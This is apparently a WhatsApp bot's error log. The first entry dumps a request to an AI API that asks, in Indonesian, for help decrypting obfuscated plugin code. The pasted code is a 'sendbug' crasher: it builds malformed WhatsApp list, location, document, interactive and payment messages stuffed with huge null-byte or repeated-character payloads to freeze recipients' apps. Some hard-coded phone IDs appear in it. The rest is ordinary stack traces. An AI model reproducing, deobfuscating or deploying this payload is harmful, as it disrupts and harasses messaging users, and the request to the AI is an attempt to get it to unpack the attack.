    data: `{"query":"tolong decrypt code ini\\n// buy the script to get the full code\\nconst _0x28f782=_0x2f45;(function(_0x52e698,_0x41f67f){const _0x35e4da=_0x2f45,_0x4803c8=_0x52e698();while(!![]){try{const _0x267c2c=-parseInt(_0x35e4da(0xd5))/0x1*(-parseInt(_0x35e4da(0xa6))/0x2)+-parseInt(_0x35e4da(0xe0))/0x3*(-parseInt(_0x35e4da(0x87))/0x4)+-parseInt(_0x35e4da(0xe2))/0x5*(-parseInt(_0x35e4da(0xe5))/0x6)+parseInt(_0x35e4da(0xb1))/0x7+-parseInt(_0x35e4da(0x96))/0x8+-parseInt(_0x35e4da(0xa9))/0x9+-parseInt(_0x35e4da(0xbe))/0xa;if(_0x267c2c===_0x41f67f)break;else _0x4803c8['push'](_0x4803c8['shift']());}catch(_0x3c992b){_0x4803c8['push'](_0x4803c8['shift']());}}}(_0x301d,0x5872a));const _0x5a60f1=(function(){let _0x382fe0=!![];return function(_0xbd8681,_0x6c16c5){const _0x67fc2b=_0x382fe0?function(){const _0x48aea3=_0x2f45;if(_0x6c16c5){const _0x2ad097=_0x6c16c5[_0x48aea3(0xcf)](_0xbd8681,arguments);return _0x6c16c5=null,_0x2ad097;}}:function(){};return _0x382fe0=![],_0x67fc2b;};}()),_0xe1b1a7=_0x5a60f1(this,function(){const _0x5dd7d0=_0x2f45;return _0xe1b1a7[_0x5dd7d0(0xc2)]()['search']('(((.+)+)+)+$')[_0x5dd7d0(0xc2)]()[_0x5dd7d0(0xc5)](_0xe1b1a7)[_0x5dd7d0(0xde)](_0x5dd7d0(0xbd));});_0xe1b1a7();const fs=require('fs'),{proto,prepareWAMessageMedia,generateWAMessageFromContent}=global[_0x28f782(0x8c)];function _0x2f45(_0x385410,_0x2158e7){const _0x7e90c0=_0x301d();return _0x2f45=function(_0xe1b1a7,_0x5a60f1){_0xe1b1a7=_0xe1b1a7-0x86;let _0x301de5=_0x7e90c0[_0xe1b1a7];return _0x301de5;},_0x2f45(_0x385410,_0x2158e7);}exports[_0x28f782(0xd4)]={'usage':[_0x28f782(0xe1),_0x28f782(0xe3),_0x28f782(0x9d),_0x28f782(0xbc),_0x28f782(0xb6),'sendbugv5'],'use':_0x28f782(0xba),'category':_0x28f782(0xc0),'async':async(_0x1d7f3a,{func:_0x28b0d2,mecha:_0x1442ca,froms:_0x285e80})=>{const _0x4529ca=_0x28f782,_0x3ddf8a=[_0x4529ca(0xcc),'62882003321562@s.whatsapp.net','6285700408187@s.whatsapp.net','6289504842184@s.whatsapp.net',_0x4529ca(0xa1),_0x4529ca(0xb0)];async function _0x5b8ad2(_0x4e9023,_0x14293c){const _0x2d4e23=_0x4529ca;var _0x39e443=generateWAMessageFromContent(_0x4e9023,proto[_0x2d4e23(0x88)][_0x2d4e23(0xb2)]({'listMessage':{'title':_0x2d4e23(0xae)+'\\\\x00'['repeat'](0xe09c0),'footerText':'✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑\\\\x20☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp','description':'✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑\\\\x20☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp','buttonText':null,'listType':0x2,'productListInfo':{'productSections':[{'title':_0x2d4e23(0xd6),'products':[{'productId':_0x2d4e23(0xa5)}]}],'productListHeaderImage':{'productId':_0x2d4e23(0xa5),'jpegThumbnail':null},'businessOwnerJid':'0@s.whatsapp.net'}},'footer':_0x2d4e23(0xbf),'contextInfo':{'expiration':0x93a80,'ephemeralSettingTimestamp':_0x2d4e23(0xa2),'entryPointConversionSource':_0x2d4e23(0x89),'entryPointConversionApp':_0x2d4e23(0xd3),'entryPointConversionDelaySeconds':0x9,'disappearingMode':{'initiator':_0x2d4e23(0xaa)}},'selectListType':0x2,'product_header_info':{'product_header_info_id':0x4433e2e130,'product_header_is_rejected':![]}}),{'userJid':_0x4e9023,'quoted':_0x5b641d});await _0x1442ca[_0x2d4e23(0xd9)](_0x4e9023,_0x39e443[_0x2d4e23(0xe9)],{'participant':{'jid':_0x4e9023},'messageId':_0x39e443[_0x2d4e23(0x8d)]['id']});}async function _0x5fcb6f(_0x2ad06c,_0x2f2852){const _0x893384=_0x4529ca;var _0x37adb1=generateWAMessageFromContent(_0x2ad06c,proto['Message'][_0x893384(0xb2)]({'viewOnceMessage':{'message':{'liveLocationMessage':{'degreesLatitude':'p','degreesLongitude':'p','caption':_0x893384(0xa4)+'ꦾ'[_0x893384(0x8e)](0xc350),'sequenceNumber':'0','jpegThumbnail':''}}}}),{'userJid':_0x2ad06c,'quoted':_0x2f2852});await _0x1442ca[_0x893384(0xd9)](_0x2ad06c,_0x37adb1['message'],{'participant':{'jid':_0x2ad06c},'messageId':_0x37adb1['key']['id']});}async function _0x3c1c9a(_0x28f200,_0xebc03d){const _0x15e623=_0x4529ca;var _0x2ce9c5=generateWAMessageFromContent(_0x28f200,proto['Message'][_0x15e623(0xb2)]({'stickerMessage':{'url':_0x15e623(0x9f),'fileSha256':_0x15e623(0xda),'fileEncSha256':'r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=','mediaKey':_0x15e623(0xe8),'mimetype':_0x15e623(0xc8),'directPath':_0x15e623(0xb3),'fileLength':_0x15e623(0xc7),'mediaKeyTimestamp':_0x15e623(0xdf),'isAnimated':![],'stickerSentTs':'1715881084144','isAvatar':![],'isAiSticker':![],'isLottie':![]}}),{'userJid':_0x28f200,'quoted':_0xebc03d});await _0x1442ca[_0x15e623(0xd9)](_0x28f200,_0x2ce9c5['message'],{'participant':{'jid':_0x28f200},'messageId':_0x2ce9c5[_0x15e623(0x8d)]['id']});}async function _0x562685(_0x8ae5d3,_0x35595d){const _0x5b4843=_0x4529ca;var _0x2489cc=generateWAMessageFromContent(_0x8ae5d3,proto[_0x5b4843(0x88)]['fromObject']({'documentMessage':{'url':'https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true','mimetype':'penis','fileSha256':_0x5b4843(0xd2),'fileLength':_0x5b4843(0xab),'pageCount':0x3b9ac9ff,'mediaKey':_0x5b4843(0x8a),'fileName':_0x5b4843(0xa4)+'ྦྷ'[_0x5b4843(0x8e)](0xea60),'fileEncSha256':'pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=','directPath':_0x5b4843(0xc9),'mediaKeyTimestamp':'1715880173'}}),{'userJid':_0x8ae5d3,'quoted':_0x35595d});await _0x1442ca[_0x5b4843(0xd9)](_0x8ae5d3,_0x2489cc['message'],{'participant':{'jid':_0x8ae5d3},'messageId':_0x2489cc[_0x5b4843(0x8d)]['id']});}async function _0x8713c6(_0x192e18,_0xd5ca){const _0x47aa5b=_0x4529ca;var _0x5a68f5=generateWAMessageFromContent(_0x192e18,proto[_0x47aa5b(0x88)]['fromObject']({'interactiveMessage':{'header':{'title':_0x47aa5b(0x9e),'hasMediaAttachment':!![],...await prepareWAMessageMedia({'image':{'url':_0x47aa5b(0xb4)}},{'upload':_0x1442ca[_0x47aa5b(0xcb)]})},'body':{'text':''},'footer':{'text':_0x47aa5b(0xac)},'nativeFlowMessage':{'messageParamsJson':'\\\\x00'['repeat'](0xf4240)}}}),{'userJid':_0x192e18,'quoted':_0xd5ca});await _0x1442ca[_0x47aa5b(0xd9)](_0x192e18,_0x5a68f5[_0x47aa5b(0xe9)],{'participant':{'jid':_0x192e18},'messageId':_0x5a68f5[_0x47aa5b(0x8d)]['id']});}async function _0x5b8ad2(_0x2d992a,_0x42ae6a){const _0x463364=_0x4529ca;var _0xa39e90=generateWAMessageFromContent(_0x2d992a,proto[_0x463364(0x88)]['fromObject']({'listMessage':{'title':_0x463364(0xae)+'\\\\x00'[_0x463364(0x8e)](0xe09c0),'footerText':_0x463364(0xa4),'description':_0x463364(0xa4),'buttonText':null,'listType':0x2,'productListInfo':{'productSections':[{'title':'anjay','products':[{'productId':_0x463364(0xa5)}]}],'productListHeaderImage':{'productId':_0x463364(0xa5),'jpegThumbnail':null},'businessOwnerJid':_0x463364(0xad)}},'footer':_0x463364(0xa0),'contextInfo':{'expiration':0x93a80,'ephemeralSettingTimestamp':_0x463364(0xa2),'entryPointConversionSource':_0x463364(0x89),'entryPointConversionApp':_0x463364(0xd3),'entryPointConversionDelaySeconds':0x9,'disappearingMode':{'initiator':_0x463364(0xaa)}},'selectListType':0x2,'product_header_info':{'product_header_info_id':0x4433e2e130,'product_header_is_rejected':![]}}),{'userJid':_0x2d992a,'quoted':_0x5b641d});await _0x1442ca[_0x463364(0xd9)](_0x2d992a,_0xa39e90[_0x463364(0xe9)],{'participant':{'jid':_0x2d992a},'messageId':_0xa39e90[_0x463364(0x8d)]['id']});}async function _0x27103f(_0x8fedef){const _0x31ce4e=_0x4529ca;await _0x1442ca[_0x31ce4e(0xd9)](_0x8fedef,{'paymentInviteMessage':{'serviceType':'FBPAY','expiryTimestamp':Date['now']()+0x6c258c00}},{'participant':{'jid':_0x8fedef}});}const _0x5b641d={'key':{'participant':_0x4529ca(0xad),..._0x1d7f3a['chat']?{'remoteJid':'status@broadcast'}:{}},'message':{'listResponseMessage':{'title':_0x4529ca(0xb9)}}},_0x2a4f24={'key':{'participant':_0x4529ca(0xad),..._0x1d7f3a['chat']?{'remoteJid':_0x4529ca(0xa3)}:{}},'message':{'interactiveMessage':{'header':{'hasMediaAttachment':!![],'jpegThumbnail':null},'nativeFlowMessage':{'buttons':[{'name':'review_and_pay','buttonParamsJson':_0x4529ca(0x8b)}]}}}},_0x431aea={'key':{'participant':'0@s.whatsapp.net',..._0x1d7f3a[_0x4529ca(0x99)]?{'remoteJid':'status@broadcast'}:{}},'message':{'interactiveMessage':{'header':{'hasMediaAttachment':!![],'jpegThumbnail':null},'nativeFlowMessage':{'buttons':[{'name':_0x4529ca(0xc6),'buttonParamsJson':'{\\\\x22currency\\\\x22:\\\\x22IDR\\\\x22,\\\\x22total_amount\\\\x22:{\\\\x22value\\\\x22:49981399788,\\\\x22offset\\\\x22:100},\\\\x22reference_id\\\\x22:\\\\x224OON4PX3FFJ\\\\x22,\\\\x22type\\\\x22:\\\\x22physical-goods\\\\x22,\\\\x22order\\\\x22:{\\\\x22status\\\\x22:\\\\x22payment_requested\\\\x22,\\\\x22subtotal\\\\x22:{\\\\x22value\\\\x22:49069994400,\\\\x22offset\\\\x22:100},\\\\x22tax\\\\x22:{\\\\x22value\\\\x22:490699944,\\\\x22offset\\\\x22:100},\\\\x22discount\\\\x22:{\\\\x22value\\\\x22:485792999999,\\\\x22offset\\\\x22:100},\\\\x22shipping\\\\x22:{\\\\x22value\\\\x22:48999999900,\\\\x22offset\\\\x22:100},\\\\x22order_type\\\\x22:\\\\x22ORDER\\\\x22,\\\\x22items\\\\x22:[{\\\\x22retailer_id\\\\x22:\\\\x227842674605763435\\\\x22,\\\\x22product_id\\\\x22:\\\\x227842674605763435\\\\x22,\\\\x22name\\\\x22:\\\\x22✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑\\\\x20☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴\\\\x20#\\\\x20𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\\\\x22,\\\\x22amount\\\\x22:{\\\\x22value\\\\x22:9999900,\\\\x22offset\\\\x22:100},\\\\x22quantity\\\\x22:7},{\\\\x22retailer_id\\\\x22:\\\\x22custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\\\\x22,\\\\x22name\\\\x22:\\\\x22\\\\x22,\\\\x22amount\\\\x22:{\\\\x22value\\\\x22:999999900,\\\\x22offset\\\\x22:100},\\\\x22quantity\\\\x22:49}]},\\\\x22native_payment_methods\\\\x22:[]}'}]}}}},[_0x21135b,_0xf96a8b]=_0x1d7f3a['text'][_0x4529ca(0xc4)](',');switch(_0x1d7f3a['command']){case _0x4529ca(0xe1):{if(!_0x21135b)return _0x1d7f3a[_0x4529ca(0xdc)](_0x28b0d2[_0x4529ca(0xbb)](_0x1d7f3a[_0x4529ca(0x9b)],_0x4529ca(0xb8)));if(!_0xf96a8b)return _0x1d7f3a[_0x4529ca(0xdc)](_0x28b0d2['example'](_0x1d7f3a['cmd'],_0x4529ca(0xb8)));if(isNaN(_0xf96a8b))return _0x1d7f3a['reply']('Jumlah\\\\x20harus\\\\x20berupa\\\\x20angka!\\\\x0aContoh:\\\\x20*'+_0x1d7f3a[_0x4529ca(0x9b)]+_0x4529ca(0x8f));_0x1442ca[_0x4529ca(0xdb)](_0x1d7f3a[_0x4529ca(0x99)],_0x4529ca(0xc1),['sendbugv1\\\\x20'+_0x21135b+','+_0xf96a8b,_0x4529ca(0x97)+_0x21135b+','+_0xf96a8b,'sendbugv3\\\\x20'+_0x21135b+','+_0xf96a8b,_0x4529ca(0xdd)+_0`... 10336 more characters
  },
  request: <ref *1> ClientRequest {
    _events: [Object: null prototype] {
      abort: [Function (anonymous)],
      aborted: [Function (anonymous)],
      connect: [Function (anonymous)],
      error: [Function (anonymous)],
      socket: [Function (anonymous)],
      timeout: [Function (anonymous)],
      finish: [Function: requestOnFinish]
    },
    _eventsCount: 7,
    _maxListeners: undefined,
    outputData: [],
    outputSize: 0,
    writable: true,
    destroyed: true,
    _last: false,
    chunkedEncoding: false,
    shouldKeepAlive: true,
    maxRequestsOnConnectionReached: false,
    _defaultKeepAlive: true,
    useChunkedEncodingByDefault: true,
    sendDate: false,
    _removedConnection: false,
    _removedContLen: false,
    _removedTE: false,
    strictContentLength: false,
    _contentLength: '20643',
    _hasBody: true,
    _trailer: '',
    finished: true,
    _headerSent: true,
    _closed: true,
    _header: 'POST /api/ai/gpt4 HTTP/1.1\r\n' +
      'Accept: application/json, text/plain, */*\r\n' +
      'Content-Type: application/json\r\n' +
      'User-Agent: axios/1.7.3\r\n' +
      'Content-Length: 20643\r\n' +
      'Accept-Encoding: gzip, compress, deflate, br\r\n' +
      'Host: api.yanzbotz.my.id\r\n' +
      'Connection: keep-alive\r\n' +
      '\r\n',
    _keepAliveTimeout: 0,
    _onPendingData: [Function: nop],
    agent: Agent {
      _events: [Object: null prototype],
      _eventsCount: 2,
      _maxListeners: undefined,
      defaultPort: 443,
      protocol: 'https:',
      options: [Object: null prototype],
      requests: [Object: null prototype] {},
      sockets: [Object: null prototype] {},
      freeSockets: [Object: null prototype] {},
      keepAliveMsecs: 1000,
      keepAlive: true,
      maxSockets: Infinity,
      maxFreeSockets: 256,
      scheduling: 'lifo',
      maxTotalSockets: Infinity,
      totalSocketCount: 0,
      maxCachedSessions: 100,
      _sessionCache: [Object],
      [Symbol(shapeMode)]: false,
      [Symbol(kCapture)]: false
    },
    socketPath: undefined,
    method: 'POST',
    maxHeaderSize: undefined,
    insecureHTTPParser: undefined,
    joinDuplicateHeaders: undefined,
    path: '/api/ai/gpt4',
    _ended: false,
    res: IncomingMessage {
      _events: [Object],
      _readableState: [ReadableState],
      _maxListeners: undefined,
      socket: [TLSSocket],
      httpVersionMajor: 1,
      httpVersionMinor: 1,
      httpVersion: '1.1',
      complete: false,
      rawHeaders: [Array],
      rawTrailers: [],
      joinDuplicateHeaders: undefined,
      aborted: true,
      upgrade: false,
      url: '',
      method: null,
      statusCode: 200,
      statusMessage: 'OK',
      client: [TLSSocket],
      _consuming: true,
      _dumped: false,
      req: [Circular *1],
      _eventsCount: 4,
      responseUrl: 'https://api.yanzbotz.my.id/api/ai/gpt4',
      redirects: [],
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kHeaders)]: [Object],
      [Symbol(kHeadersCount)]: 26,
      [Symbol(kTrailers)]: null,
      [Symbol(kTrailersCount)]: 0
    },
    aborted: false,
    timeoutCb: [Function: emitRequestTimeout],
    upgradeOrConnect: false,
    parser: null,
    maxHeadersCount: null,
    reusedSocket: false,
    host: 'api.yanzbotz.my.id',
    protocol: 'https:',
    _redirectable: Writable {
      _events: [Object],
      _writableState: [WritableState],
      _maxListeners: undefined,
      _options: [Object],
      _ended: true,
      _ending: true,
      _redirectCount: 0,
      _redirects: [],
      _requestBodyLength: 20643,
      _requestBodyBuffers: [],
      _eventsCount: 3,
      _onNativeResponse: [Function (anonymous)],
      _currentRequest: [Circular *1],
      _currentUrl: 'https://api.yanzbotz.my.id/api/ai/gpt4',
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false
    },
    [Symbol(shapeMode)]: false,
    [Symbol(kCapture)]: false,
    [Symbol(kBytesWritten)]: 0,
    [Symbol(kNeedDrain)]: false,
    [Symbol(corked)]: 0,
    [Symbol(kChunkedBuffer)]: [],
    [Symbol(kChunkedLength)]: 0,
    [Symbol(kSocket)]: TLSSocket {
      _tlsOptions: [Object],
      _secureEstablished: true,
      _securePending: false,
      _newSessionPending: false,
      _controlReleased: true,
      secureConnecting: false,
      _SNICallback: null,
      servername: 'api.yanzbotz.my.id',
      alpnProtocol: false,
      authorized: true,
      authorizationError: null,
      encrypted: true,
      _events: [Object: null prototype],
      _eventsCount: 11,
      connecting: false,
      _hadError: false,
      _parent: null,
      _host: 'api.yanzbotz.my.id',
      _closeAfterHandlingError: false,
      _readableState: [ReadableState],
      _writableState: [WritableState],
      allowHalfOpen: false,
      _maxListeners: undefined,
      _sockname: null,
      _pendingData: null,
      _pendingEncoding: '',
      server: undefined,
      _server: null,
      ssl: null,
      _requestCert: true,
      _rejectUnauthorized: false,
      timeout: 5000,
      parser: null,
      _httpMessage: [Circular *1],
      autoSelectFamilyAttemptedAddresses: [Array],
      write: [Function: writeAfterFIN],
      [Symbol(alpncallback)]: null,
      [Symbol(res)]: null,
      [Symbol(verified)]: true,
      [Symbol(pendingSession)]: null,
      [Symbol(async_id_symbol)]: 152248,
      [Symbol(kHandle)]: null,
      [Symbol(lastWriteQueueSize)]: 0,
      [Symbol(timeout)]: Timeout {
        _idleTimeout: -1,
        _idlePrev: null,
        _idleNext: null,
        _idleStart: 2660378,
        _onTimeout: null,
        _timerArgs: undefined,
        _repeat: null,
        _destroyed: true,
        [Symbol(refed)]: false,
        [Symbol(kHasPrimitive)]: false,
        [Symbol(asyncId)]: 158839,
        [Symbol(triggerId)]: 152248
      },
      [Symbol(kBuffer)]: null,
      [Symbol(kBufferCb)]: null,
      [Symbol(kBufferGen)]: null,
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kSetNoDelay)]: false,
      [Symbol(kSetKeepAlive)]: true,
      [Symbol(kSetKeepAliveInitialDelay)]: 60,
      [Symbol(kBytesRead)]: 5602,
      [Symbol(kBytesWritten)]: 20892,
      [Symbol(connect-options)]: [Object]
    },
    [Symbol(kOutHeaders)]: [Object: null prototype] {
      accept: [Array],
      'content-type': [Array],
      'user-agent': [Array],
      'content-length': [Array],
      'accept-encoding': [Array],
      host: [Array]
    },
    [Symbol(errored)]: null,
    [Symbol(kHighWaterMark)]: 65536,
    [Symbol(kRejectNonStandardBodyWrites)]: false,
    [Symbol(kUniqueHeaders)]: null
  },
  cause: Error: aborted
      at TLSSocket.socketCloseListener (node:_http_client:455:19)
      at TLSSocket.emit (node:events:532:35)
      at node:net:337:12
      at TCP.done (node:_tls_wrap:650:7) {
    code: 'ECONNRESET'
  }
}
[11/08/24 23:41:30] - Error: error:1C800064:Provider routines::bad decrypt
    at Decipheriv.final (node:internal/crypto/cipher:184:29)
    at Transform.final [as _final] (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:498:31)
    at prefinish (node:internal/streams/writable:914:14)
    at finishMaybe (node:internal/streams/writable:928:5)
    at Writable.end (node:internal/streams/writable:843:5)
    at IncomingMessage.onend (node:internal/streams/readable:946:10)
    at Object.onceWrapper (node:events:634:28)
    at IncomingMessage.emit (node:events:532:35)
    at endReadableNT (node:internal/streams/readable:1696:12)
    at process.processTicksAndRejections (node:internal/process/task_queues:82:21) {
  library: 'Provider routines',
  reason: 'bad decrypt',
  code: 'ERR_OSSL_BAD_DECRYPT'
}
[12/08/24 01:38:47] - TypeError: process.send is not a function
    at /data/data/com.termux/files/home/.BOTTT/plugins/owner/restart.js:9:9
[12/08/24 01:43:15] - TypeError: process.send is not a function
    at /data/data/com.termux/files/home/.BOTTT/plugins/owner/restart.js:9:9
[12/08/24 02:47:25] - Error: error:1C800064:Provider routines::bad decrypt
    at Decipheriv.final (node:internal/crypto/cipher:184:29)
    at Transform.final [as _final] (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:498:31)
    at prefinish (node:internal/streams/writable:914:14)
    at finishMaybe (node:internal/streams/writable:928:5)
    at Writable.end (node:internal/streams/writable:843:5)
    at IncomingMessage.onend (node:internal/streams/readable:946:10)
    at Object.onceWrapper (node:events:634:28)
    at IncomingMessage.emit (node:events:532:35)
    at endReadableNT (node:internal/streams/readable:1696:12)
    at process.processTicksAndRejections (node:internal/process/task_queues:82:21) {
  library: 'Provider routines',
  reason: 'bad decrypt',
  code: 'ERR_OSSL_BAD_DECRYPT'
}
[12/08/24 02:49:37] - Error: error:1C800064:Provider routines::bad decrypt
    at Decipheriv.final (node:internal/crypto/cipher:184:29)
    at Transform.final [as _final] (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:498:31)
    at prefinish (node:internal/streams/writable:914:14)
    at finishMaybe (node:internal/streams/writable:928:5)
    at Writable.end (node:internal/streams/writable:843:5)
    at IncomingMessage.onend (node:internal/streams/readable:946:10)
    at Object.onceWrapper (node:events:634:28)
    at IncomingMessage.emit (node:events:532:35)
    at endReadableNT (node:internal/streams/readable:1696:12)
    at process.processTicksAndRejections (node:internal/process/task_queues:82:21) {
  library: 'Provider routines',
  reason: 'bad decrypt',
  code: 'ERR_OSSL_BAD_DECRYPT'
}
